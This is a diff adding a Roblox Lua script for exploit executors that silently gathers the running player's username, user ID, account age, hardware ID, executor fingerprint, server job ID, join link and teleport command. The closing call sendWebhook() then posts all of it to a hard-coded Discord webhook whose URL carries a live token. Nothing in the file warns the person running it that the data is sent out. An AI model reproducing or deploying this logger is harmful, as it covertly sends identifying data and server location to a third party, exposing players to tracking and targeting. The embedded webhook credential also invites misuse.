@@ -1,0 +1,147 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local localPlayer = Players.LocalPlayer
+
+--// HWID
+local function getHWID()
+    local hwid = "Unavailable"
+    pcall(function()
+        if gethwid then
+            hwid = gethwid()
+        elseif syn and syn_crypt and syn_crypt.hash then
+            hwid = syn_crypt.hash(tostring(identifyexecutor()))
+        end
+    end)
+    return hwid
+end
+
+--// Executor Detection
+local function detectExecutor()
+    local checks = {
+        {cond=function() return identifyexecutor ~= nil end, name=identifyexecutor()},
+        {cond=function() return getexecutorname ~= nil end, name=getexecutorname()},
+        {cond=function() return syn and syn.protect_gui end, name="Synapse X"},
+        {cond=function() return is_sirhurt_closure ~= nil end, name="SirHurt"},
+        {cond=function() return isexecutorclosure ~= nil end, name="Script-Ware"},
+        {cond=function() return secure_load ~= nil end, name="Sentinel"},
+        {cond=function() return pebc_execute ~= nil end, name="Proxo"},
+        {cond=function() return KRNL_LOADED ~= nil end, name="KRNL"},
+        {cond=function() return fluxus ~= nil or is_fluxus_closure ~= nil end, name="Fluxus"},
+        {cond=function() return wrapfunction ~= nil and isreadonly ~= nil end, name="Electron"},
+        {cond=function() return get_hidden_ui ~= nil end, name="Dansploit"},
+        {cond=function() return shadow_env ~= nil end, name="Shadow"},
+        {cond=function() return hookmetamethod ~= nil and getrenv ~= nil and getgenv ~= nil end, name="Arceus X"},
+        {cond=function() return isourclosure ~= nil and hookfunction ~= nil end, name="Velocity"},
+        {cond=function() return is_synapse_function ~= nil and checkcaller ~= nil end, name="Swift"},
+        {cond=function() return gethiddengui ~= nil end, name="Comet"},
+        {cond=function() return cloneref ~= nil and hookfunction and checkcaller end, name="Trigon"},
+        {cond=function() return gethui and not syn and not fluxus and not KRNL_LOADED end, name="Delta"},
+        {cond=function() return getinstance ~= nil end, name="JJSploit"},
+        {cond=function() return mimikatz ~= nil end, name="WeAreDevs API"},
+        {cond=function() return getnilinstances ~= nil and setfflag ~= nil and getreg ~= nil end, name="Skisploit"},
+        {cond=function() return rawisexecutor ~= nil end, name="Ronix"},
+    }
+
+    for _, exec in ipairs(checks) do
+        local success, result = pcall(exec.cond)
+        if success and result then return exec.name end
+    end
+
+    return "Unknown"
+end
+
+--// Feature Detection
+local function getFeatureList()
+    local feats = {}
+    if setclipboard then table.insert(feats, "📋 setclipboard") end
+    if hookfunction then table.insert(feats, "🪝 hookfunction") end
+    if getgenv then table.insert(feats, "🧐 getgenv") end
+    if getrawmetatable then table.insert(feats, "🌀 getrawmetatable") end
+    if gethui then table.insert(feats, "🪟 gethui") end
+    if checkcaller then table.insert(feats, "☑️ checkcaller") end
+    if isreadonly then table.insert(feats, "📝 isreadonly") end
+    return #feats > 0 and table.concat(feats, ", ") or "None"
+end
+
+--// Game Details
+local function getGameInfo()
+    local info = {name="Unknown", creator="N/A", ctype="N/A"}
+    pcall(function()
+        local data = MarketplaceService:GetProductInfo(game.PlaceId)
+        info.name = data.Name
+        info.creator = data.Creator.Name
+        info.ctype = data.Creator.CreatorType
+    end)
+    return info
+end
+
+--// Webhook Sender
+local function sendWebhook()
+    local userId = localPlayer.UserId
+    local username = localPlayer.Name
+    local displayName = localPlayer.DisplayName
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+    local placeVersion = game.PlaceVersion
+    local playerCount = #Players:GetPlayers()
+    local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
+    local joinLink = string.format("https://www.roblox.com/games/%d?jobId=%s", placeId, jobId)
+    local teleportCmd = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', placeId, jobId)
+    local headshot = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
+
+    local hwid = getHWID()
+    local executor = detectExecutor()
+    local gameInfo = getGameInfo()
+    local features = getFeatureList()
+
+    local data = {
+        embeds = {{
+            title = "Roblox Session Details",
+            color = 0x00bfff,
+            thumbnail = { url = headshot },
+            fields = {
+                { name = "Username", value = username, inline = true },
+                { name = "Display Name", value = displayName, inline = true },
+                { name = "User ID", value = tostring(userId), inline = true },
+                { name = "Profile", value = profileUrl, inline = false },
+                { name = "Account Age", value = tostring(localPlayer.AccountAge) .. " days", inline = true },
+                { name = "Players in Server", value = tostring(playerCount), inline = true },
+                { name = "Game", value = gameInfo.name, inline = false },
+                { name = "Place ID", value = tostring(placeId), inline = true },
+                { name = "Place Version", value = tostring(placeVersion), inline = true },
+                { name = "Creator", value = gameInfo.creator .. " (" .. gameInfo.ctype .. ")", inline = true },
+                { name = "Job ID", value = jobId, inline = false },
+                { name = "Join Link", value = joinLink, inline = false },
+                { name = "Job Join Code", value = "```lua\n" .. teleportCmd .. "\n```", inline = false },
+                { name = "Executor", value = executor, inline = true },
+                { name = "HWID", value = hwid, inline = false },
+                { name = "Features", value = features, inline = false },
+                { name = "Client Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true },
+                { name = "UTC Time", value = os.date("!%Y-%m-%d %H:%M:%S"), inline = true },
+            },
+            footer = { text = "made by ah punisher" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    local requestFunc = (syn and syn.request)
+        or (http and http.request)
+        or request
+        or (fluxus and fluxus.request)
+        or (krnl and krnl.request)
+
+    if requestFunc then
+        requestFunc({
+            Url = "https://discord.com/api/webhooks/1386785791069520073/puPsiKRqOCjEAUwlHCZJp9A_Lktz2QSxQl15HrwxhsDHVOXHQKxtT7bO0jg9QXEIf2ih",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(data)
+        })
+    else
+        warn("No supported HTTP request method found.")
+    end
+end
+
+--// Trigger it
+sendWebhook()
